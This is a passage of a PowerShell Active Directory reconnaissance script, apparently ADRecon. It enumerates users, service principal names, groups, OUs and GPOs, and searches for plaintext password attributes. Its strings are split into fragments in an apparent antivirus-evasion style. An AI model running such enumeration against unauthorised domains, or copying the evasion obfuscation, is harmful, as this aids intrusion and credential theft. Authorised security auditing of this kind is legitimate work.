            $ObjSearcher.PropertiesToLoad.AddRange((('a'+'cco'+'un'+'tExpire'+'s'),('a'+'dm'+'incount'),"c",('can'+'o'+'nical'+'name'),('compan'+'y'),('d'+'epartm'+'ent'),('des'+'cri'+'ptio'+'n'),('di'+'stingui'+'sh'+'edname'),('giv'+'enNam'+'e'),('homed'+'irec'+'tory'),('inf'+'o'),('lastLogont'+'i'+'mestam'+'p'),('mai'+'l'),('ma'+'nag'+'er'),('membe'+'ro'+'f'),('mid'+'d'+'leNam'+'e'),('mobil'+'e'),('ms'+'DS-Allo'+'we'+'d'+'ToDe'+'legat'+'eTo'),('msDS-Suppor'+'tedEnc'+'r'+'y'+'ptio'+'n'+'Type'+'s'),('na'+'me'),('nt'+'secu'+'rity'+'des'+'cri'+'pto'+'r'),('ob'+'jects'+'id'),('pr'+'imar'+'y'+'groupid'),('profile'+'p'+'at'+'h'),('pwd'+'La'+'stS'+'et'),('samaccoun'+'tNam'+'e'),('scriptpa'+'t'+'h'),('servi'+'ceprinc'+'ip'+'alname'),('sidh'+'i'+'sto'+'ry'),'sn',('ti'+'tle'),('usera'+'ccountcon'+'tro'+'l'),('userw'+'orks'+'t'+'at'+'ions'),('whenc'+'h'+'anged'),('whencreat'+'e'+'d')))
            $ObjSearcher.SearchScope = ('S'+'ubtree')
            Try
            {
                $ADUsers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning ('['+'G'+'e'+'t-ADR'+'Use'+'r] Erro'+'r while '+'e'+'nu'+'mer'+'at'+'ing User '+'Object'+'s')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.dispose()
        }
        If ($ADUsers)
        {
            Write-Verbose "[*] Total Users: $([ADRecon.LDAPClass]::ObjectCount($ADUsers)) "
            If ($ADRUsers)
            {
                $PassMaxAge = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000)
                If (-Not $PassMaxAge)
                {
                    Write-Warning ('[Get-AD'+'R'+'U'+'s'+'er] '+'Error retri'+'evi'+'ng'+' M'+'ax '+'Passwo'+'rd'+' Age'+' '+'f'+'rom'+' t'+'he Defaul'+'t '+'Pa'+'ss'+'wor'+'d Policy. Us'+'i'+'ng v'+'alue as '+'90'+' day'+'s')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj = [ADRecon.LDAPClass]::UserParser($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj = [ADRecon.LDAPClass]::UserSPNParser($ADUsers, $Threads)
            }
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Export-ADR -ADRObj $UserObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Use'+'rs')
        Remove-Variable UserObj
    }
    If ($UserSPNObj)
    {
        Export-ADR -ADRObj $UserSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Use'+'rSPN'+'s')
        Remove-Variable UserSPNObj
    }
}

#TODO
Function Get-ADRPasswordAttributes
{
<#
.SYNOPSIS
    Returns all objects with plaintext passwords in the current (or specified) domain.

.DESCRIPTION
    Returns all objects with plaintext passwords in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.OUTPUTS
    PSObject.

.LINK
    https://www.ibm.com/support/knowledgecenter/en/ssw_aix_71/com.ibm.aix.security/ad_password_attribute_selection.htm
    https://msdn.microsoft.com/en-us/library/cc223248.aspx
    https://msdn.microsoft.com/en-us/library/cc223249.aspx
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Method -eq ('AD'+'WS'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter (('({0}(UserP'+'a'+'ss'+'w'+'or'+'d=*)(Un'+'ixUserPa'+'ssw'+'ord=*)('+'unicod'+'eP'+'wd=*'+')(msSFU3'+'0Pas'+'swor'+'d'+'=*'+'))')-f [ChaR]124) -ResultPageSize $PageSize -Properties *
        }
        Catch
        {
            Write-Warning ('[Get-ADR'+'Passwo'+'rdAttrib'+'ute'+'s] Error while enume'+'rat'+'ing'+' Pass'+'word A'+'t'+'t'+'ributes')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            Write-Warning "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (('(SNH(Us'+'erPassword=*)(UnixUserPas'+'sw'+'or'+'d=*)('+'uni'+'codeP'+'wd=*)('+'msSFU30P'+'assword=*)'+')')-RePlACE  'SNH',[CHAr]124)
        $ObjSearcher.SearchScope = ('Subt'+'ree')
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('['+'Get'+'-ADRPasswordA'+'ttrib'+'ute'+'s] E'+'rror w'+'hi'+'l'+'e e'+'numer'+'a'+'t'+'i'+'ng Pass'+'word Attr'+'i'+'butes')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $cnt = [ADRecon.LDAPClass]::ObjectCount($ADUsers)
            If ($cnt -gt 0)
            {
                Write-Warning ('[*]'+' '+'Tot'+'al '+'P'+'assword'+'At'+'tr'+'ibute '+'Obj'+'ects'+': '+"$cnt")
            }
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGroup
{
<#
.SYNOPSIS
    Returns all groups and/or membership changes in the current (or specified) domain.

.DESCRIPTION
    Returns all groups and/or membership changes in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER date
    [DateTime]
    Date when ADRecon was executed.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.PARAMETER OutputType
    [array]
    Output Type.

.PARAMETER ADRGroups
    [bool]

.PARAMETER ADRGroupChanges
    [bool]

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [bool] $ADRGroups = $true,

        [Parameter(Mandatory = $false)]
        [bool] $ADRGroupChanges = $false
    )

    If ($Method -eq ('ADW'+'S'))
    {
        Try
        {
            $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties AdminCount,CanonicalName,DistinguishedName,Description,GroupCategory,GroupScope,SamAccountName,SID,SIDHistory,managedBy,('msDS-Rep'+'lVal'+'u'+'e'+'Meta'+'Da'+'ta'),whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-'+'ADRGr'+'o'+'up]'+' E'+'rror wh'+'ile enum'+'erating Gro'+'up '+'Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj = [ADRecon.ADWSClass]::GroupParser($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj = [ADRecon.ADWSClass]::GroupChangeParser($ADGroups, $date, $Threads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('('+'ob'+'jec'+'tClass=grou'+'p)')
        $ObjSearcher.PropertiesToLoad.AddRange((('ad'+'mincou'+'nt'),('ca'+'nonicaln'+'am'+'e'), ('disting'+'u'+'ishe'+'d'+'name'), ('des'+'c'+'r'+'iption'), ('gr'+'oup'+'type'),('sama'+'cc'+'oun'+'tnam'+'e'), ('sidhis'+'t'+'or'+'y'), ('ma'+'na'+'gedby'), ('msds'+'-r'+'ep'+'lvalu'+'emeta'+'dat'+'a'), ('obje'+'c'+'tsid'), ('w'+'hencreat'+'ed'), ('w'+'hench'+'ange'+'d')))
        $ObjSearcher.SearchScope = ('S'+'ubt'+'ree')

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[G'+'et'+'-A'+'DRG'+'roup] '+'Error while enumerating '+'Gro'+'up Ob'+'jects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj = [ADRecon.LDAPClass]::GroupParser($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj = [ADRecon.LDAPClass]::GroupChangeParser($ADGroups, $date, $Threads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If ($GroupObj)
    {
        Export-ADR -ADRObj $GroupObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Gr'+'oups')
        Remove-Variable GroupObj
    }

    If ($GroupChangesObj)
    {
        Export-ADR -ADRObj $GroupChangesObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ('Gr'+'oupCha'+'nge'+'s')
        Remove-Variable GroupChangesObj
    }
}

Function Get-ADRGroupMember
{
<#
.SYNOPSIS
    Returns all groups and their members in the current (or specified) domain.

.DESCRIPTION
    Returns all groups and their members in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ('ADW'+'S'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
            $ADDomainSID = $ADDomain.DomainSID.Value
            Remove-Variable ADDomain
        }
        Catch
        {
            Write-Warning ('['+'Ge'+'t-ADR'+'GroupMem'+'ber] Error ge'+'ttin'+'g'+' Domain'+' Co'+'ntex'+'t')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGroups = $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties SamAccountName,SID )
        }
        Catch
        {
            Write-Warning ('[G'+'e'+'t'+'-'+'ADRGroup'+'Member] '+'Error'+' whi'+'le'+' '+'en'+'umer'+'at'+'i'+'n'+'g Group'+' Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            $ADGroupMembers = @( Get-ADObject -LDAPFilter (('(Xl'+'Z'+'('+'me'+'mbe'+'rof'+'=*)(primarygro'+'u'+'pid=*'+'))').REPlAcE('XlZ',[strINg][ChAR]124)) -Properties DistinguishedName,ObjectClass,memberof,primaryGroupID,sAMAccountName,samaccounttype )
        }
        Catch
        {
            Write-Warning ('['+'Ge'+'t-AD'+'RG'+'r'+'oupMem'+'ber] E'+'r'+'ror whil'+'e '+'enum'+'eratin'+'g'+' GroupMemb'+'er '+'Object'+'s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj = [ADRecon.ADWSClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($Method -eq ('LD'+'AP'))
    {

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('D'+'o'+'main'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ('[Ge'+'t-A'+'DRGroup'+'Mem'+'ber]'+' '+'Er'+'ror ge'+'t'+'t'+'in'+'g Domai'+'n C'+'ontext')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Fo'+'rest'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning ('['+'Get'+'-A'+'D'+'RGroupMember'+']'+' '+'Erro'+'r getting Fo'+'res'+'t'+' Context')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('('+'obj'+'ectC'+'lass=g'+'r'+'oup)')
        $ObjSearcher.PropertiesToLoad.AddRange((('sa'+'macco'+'untnam'+'e'), ('obj'+'ectsi'+'d')))
        $ObjSearcher.SearchScope = ('Sub'+'tree')

        Try
        {
            $ADGroups = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get-ADRGroupMe'+'mber'+'] Err'+'or '+'whil'+'e e'+'n'+'u'+'m'+'er'+'ating '+'Group Object'+'s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (('(U'+'g'+'a('+'me'+'mb'+'e'+'rof'+'=*)(primarygroup'+'id'+'=*)'+')')-repLacE'Uga',[chaR]124)
        $ObjSearcher.PropertiesToLoad.AddRange((('dist'+'i'+'n'+'guished'+'nam'+'e'), ('dns'+'ho'+'stname'), ('o'+'bject'+'c'+'lass'), ('prima'+'ry'+'grou'+'pid'), ('membero'+'f'), ('sam'+'a'+'ccountname'), ('samacc'+'o'+'untt'+'ype')))
        $ObjSearcher.SearchScope = ('S'+'ubtre'+'e')

        Try
        {
            $ADGroupMembers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-ADR'+'Gr'+'oupMemb'+'er'+'] '+'Error w'+'hi'+'le e'+'n'+'u'+'mera'+'ti'+'n'+'g '+'G'+'rou'+'pMember Obj'+'ec'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj = [ADRecon.LDAPClass]::GroupMemberParser($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($GroupMemberObj)
    {
        Return $GroupMemberObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADROU
{
<#
.SYNOPSIS
    Returns all Organizational Units (OU) in the current (or specified) domain.

.DESCRIPTION
    Returns all Organizational Units (OU) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ('AD'+'WS'))
    {
        Try
        {
            $ADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName,Description,Name,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning ('[Get-AD'+'ROU] '+'Erro'+'r whi'+'le e'+'numera'+'ting '+'OU Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs)) "
            $OUObj = [ADRecon.ADWSClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($Method -eq ('L'+'DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('(objec'+'t'+'class'+'='+'or'+'gani'+'zatio'+'nalu'+'nit)')
        $ObjSearcher.PropertiesToLoad.AddRange((('disti'+'ng'+'u'+'ishedna'+'me'),('des'+'crip'+'tion'),('n'+'ame'),('w'+'hencreate'+'d'),('wh'+'ench'+'anged')))
        $ObjSearcher.SearchScope = ('Sub'+'tree')

        Try
        {
            $ADOUs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get-ADRO'+'U] Error whi'+'le '+'e'+'numera'+'ti'+'ng'+' OU '+'Obje'+'c'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs)) "
            $OUObj = [ADRecon.LDAPClass]::OUParser($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($OUObj)
    {
        Return $OUObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGPO
{
<#
.SYNOPSIS
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.DESCRIPTION
    Returns all Group Policy Objects (GPO) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ('AD'+'WS'))
    {
        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter ('(o'+'bje'+'ctC'+'atego'+'r'+'y=group'+'PolicyC'+'ontain'+'e'+'r'+')') -Properties DisplayName,DistinguishedName,Name,gPCFileSysPath,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning ('[Get-ADRGPO] '+'E'+'rror '+'whi'+'l'+'e enu'+'merating g'+'ro'+'up'+'Poli'+'c'+'yCon'+'t'+'ainer'+' Obje'+'c'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs)) "
            $GPOsObj = [ADRecon.ADWSClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('(o'+'bjec'+'tCategory=g'+'roupPo'+'licyCon'+'tai'+'ne'+'r)')
        $ObjSearcher.SearchScope = ('Su'+'btr'+'ee')

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('['+'Get-ADR'+'GP'+'O] Er'+'ror wh'+'ile'+' en'+'umerating '+'gr'+'oup'+'Po'+'lic'+'yCont'+'ainer'+' '+'Objec'+'t'+'s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs)) "
            $GPOsObj = [ADRecon.LDAPClass]::GPOParser($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($GPOsObj)
    {
        Return $GPOsObj
    }
    Else
    {
        Return $null
    }
}

# based on https://github.com/GoateePFE/GPLinkReport/blob/master/gPLinkReport.ps1
Function Get-ADRGPLink
{
<#
.SYNOPSIS
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.DESCRIPTION
    Returns all group policy links (gPLink) applied to Scope of Management (SOM) in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ('A'+'DWS'))
    {
        Try
        {
            $ADSOMs = @( Get-ADObject -LDAPFilter (('({0}(obje'+'c'+'tclass=domai'+'n)'+'(objectclass=or'+'ganization'+'al'+'Uni'+'t))') -F [cHaR]124) -Properties DistinguishedName,Name,gPLink,gPOptions )
            $ADSOMs += @( Get-ADObject -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ('(ob'+'jectc'+'lass='+'s'+'ite)') -Properties DistinguishedName,Name,gPLink,gPOptions )
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-ADR'+'G'+'PL'+'in'+'k'+'] Er'+'ro'+'r while enumerating SOM Objects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter ('(ob'+'j'+'ectC'+'a'+'tegor'+'y='+'g'+'r'+'oupPolic'+'yContaine'+'r)') -Properties DisplayName,DistinguishedName )
        }
        Catch
        {
            Write-Warning ('['+'G'+'e'+'t-ADRGP'+'Lin'+'k] '+'E'+'rr'+'or w'+'hil'+'e e'+'nu'+'m'+'erat'+'ing '+'groupPolicy'+'Cont'+'ai'+'ner'+' Objec'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs)) "
            $SOMObj = [ADRecon.ADWSClass]::SOMParser($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($Method -eq ('L'+'DAP'))
    {
        $ADSOMs = @()
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (('({0}'+'(o'+'bjectclass=dom'+'a'+'in)(obj'+'ectclass='+'o'+'r'+'gani'+'zationalUn'+'i'+'t))')-F[ChaR]124)
        $ObjSearcher.PropertiesToLoad.AddRange((('di'+'s'+'tingu'+'ishedname'),('n'+'ame'),('gpli'+'nk'),('gpo'+'pt'+'ions')))
        $ObjSearcher.SearchScope = ('Subt'+'ree')

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get-'+'ADRGPLin'+'k] Error'+' w'+'h'+'ile'+' '+'en'+'umerat'+'ing S'+'OM Obje'+'c'+'ts')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        $SearchPath = ('CN='+'Sites')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = ('(object'+'class=sit'+'e'+')')
        $ObjSearcher.PropertiesToLoad.AddRange((('d'+'istinguish'+'edn'+'ame'),('nam'+'e'),('gplin'+'k'),('g'+'poption'+'s')))
        $ObjSearcher.SearchScope = ('S'+'u'+'btree')

        Try
        {
            $ADSOMs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Ge'+'t-ADR'+'GPLin'+'k'+']'+' Erro'+'r '+'while enumera'+'ting '+'SOM O'+'bjects')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = ('(obje'+'ctCategor'+'y='+'gr'+'ou'+'pPolic'+'y'+'Cont'+'ainer)')
        $ObjSearcher.SearchScope = ('S'+'ubtree')

        Try
        {
            $ADGPOs = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ('[Get-ADRGPLink'+']'+' E'+'rr'+'or whil'+'e enu'+'mer'+'at'+'ing '+'groupPolicy'+'Conta'+'in'+'er Obj'+'ects')
